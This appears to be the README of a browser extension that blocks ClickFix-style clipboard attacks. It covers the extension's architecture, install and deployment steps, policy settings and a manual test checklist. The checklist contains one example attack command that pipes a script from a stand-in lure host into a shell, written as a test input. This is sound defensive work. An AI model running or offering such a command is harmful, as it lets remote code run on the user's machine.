# Refmon Browser Protection

A small browser extension (Firefox ESR 128+, Chromium/Chrome 121+) that catches **ClickFix-style
attacks before they run**. A web page that puts a dangerous command on the clipboard ("press Win+R,
paste, Enter to prove you are human") is judged by the local Refmon daemon the moment the page
writes it. If the command would fetch and run code, hide itself, persist, read secrets and so on,
the extension:

- replaces the clipboard with a harmless warning sentence, so pasting does nothing;
- shows a browser notification and a banner on the page that names the attack family (for example
  *ClickFix-style command from a web page*) with one sentence of advice;
- leaves everything else alone. The user is never locked out and can keep browsing. Only the one
  dangerous action is stopped.

Every clipboard write is judged as the command it would be if pasted (design decision A68). The
policy flag `browser.clipboard_commands_only` (design decision A80, off until the owner approves it)
narrows that: only text that looks like a command is judged as one; a copied address gets the
threat-list check of a navigation, prose is not judged, and a URL the user selected and copied is
never blocked (at most a warning). With the flag off, copying a plain URL from a page is judged as a
pasted command and can be blocked.

Downloads are checked against the Refmon threat lists (a hit pauses the download and asks the user).
Page addresses are checked only if an admin turns it on (`checkNavigation`, see below).

## How it fits together

```
page ──clipboard write──▶ extension ──native messaging──▶ refmon browser-host ──/api/browser──▶ refmon serve
                           (re-reads the real clipboard)    (started by the browser)            (Observe → Judge, in memory)
```

- **No open port for web pages.** The extension talks only to the native-messaging host
  `org.refmon.browser`. The browser starts that host itself and lets only this extension's ID use
  it. The host forwards to the user's own daemon with the daemon's API token, which only that user
  can read.
- **Nothing can run through this path.** `/api/browser` judges the text as written. It cannot
  execute, cannot pick a role or origin, and is rate limited.
- **Privacy.** Clipboard text and addresses exist only in memory: in the extension while a decision
  or a hold needs them, and in the daemon until Observe has fingerprinted them. Nothing raw is
  logged or stored. The extension contains no network code and no storage of content (checked by
  `tests/test_browser_extension.py`).
- **Degraded, not guessing.** If the daemon is not running, the toolbar badge shows `!` ("protection
  degraded") and nothing is judged.

## Install for one user (no root)

```sh
refmon serve --port 0 &          # the daemon; --port 0 picks a free port and records it
refmon browser-install           # launcher + Firefox manifest in your home directory
# Chromium/Chrome as well (the id is shown on chrome://extensions after loading the extension):
refmon browser-install --chromium-extension-id <ID>
```

Then load the extension:
- Firefox: `about:debugging` → *This Firefox* → *Load Temporary Add-on* → `browser/extension/manifest.json`.
- Chromium: `chrome://extensions` → developer mode → *Load unpacked* → `browser/extension/`.

## Deploy for every user on a server (admins, root)

1. Install the package (`separ_<version>_amd64.deb` / `.x86_64.rpm`), then run
   `refmon browser-install --system`. This writes `/usr/libexec/refmon/refmon-browser-host` and
   the manifests under `/usr/lib{,64}/mozilla/native-messaging-hosts/` (and under
   `/etc/chromium/…`, `/etc/opt/chrome/…` when given `--chromium-extension-id`).
2. Start one daemon per user. `packaging/browser/refmon-user.service` is a systemd **user** unit
   (`systemctl --global enable refmon-user.service`). Each daemon picks its own free port and the
   host finds it through `daemon.port` in that user's work directory, so users never collide.
3. Force-install the extension through browser policy:
   - **Firefox**: copy `packaging/browser/firefox-policies.json` to `/etc/firefox/policies/policies.json`
     (merge it with an existing file). Release and ESR builds install only signed add-ons, so
     sign the `.xpi` once as an *unlisted* (self-distributed) add-on on addons.mozilla.org, or
     use ESR with signature checks turned off by your own autoconfig. The policy also sets
     `checkNavigation` and `checkDownloads` under `3rdparty`.
   - **Chromium/Chrome**: pack the extension (`chrome://extensions` → *Pack extension*), host the
     `.crx` and an update manifest on an internal web server, and put
     `packaging/browser/chromium-policy.json` (replace the extension ID and the example update URL) in
     `/etc/chromium/policies/managed/` or `/etc/opt/chrome/policies/managed/`.

## Settings (managed by policy)

| Key | Default | Meaning |
|---|---|---|
| `checkDownloads` | `true` | check each download's address against the threat lists |
| `checkNavigation` | `false` | check every top-level page address. Off by default because it hands the address of every visited page to the daemon (fingerprinted there, never stored raw, but still a trail of fingerprints) |

## What happens in each policy mode

| Daemon mode | Block | Hold | Allow |
|---|---|---|---|
| `block` | clipboard replaced / download cancelled, banner + notification | clipboard held or download paused; banner asks *Keep it* / *Remove it*; no answer within the hold timeout = remove | nothing |
| `warn` | banner + notification only | banner only | nothing |
| `observe` | nothing visible (recorded by the daemon) | nothing visible | nothing |

*Keep it* is offered only when not all three questions failed, the same rule as an endpoint hold.

## Manual test checklist (not run in CI: there is no browser on the build machine)

Use a harmless self-made test page served from `localhost`. Never use a real lure.

1. A page whose button calls `navigator.clipboard.writeText("curl -s http://lure.example.invalid/x | sh")`:
   after the click, pasting gives the Refmon warning sentence; banner and notification name
   *ClickFix-style command from a web page*.
2. The same with `document.execCommand("copy")` from a hidden textarea, and from inside an iframe.
3. Selecting and copying `git status` from a normal page: nothing happens and the paste is unchanged.
4. Stop the daemon: the toolbar badge shows `!`; copying still works normally.
5. Put a test host on a threat list in the policy and download a file from it: the download is
   paused, *Remove it* cancels it, *Keep it* resumes it.
6. Switch the daemon to `warn` (`separ policy set-mode warn --key ...`, then `separ reload`; the
   dashboard cannot change the mode): case 1 shows only the banner and the clipboard is kept.
7. Check `logs/` in the daemon's work directory: no command text, host or path from 1–5 appears.
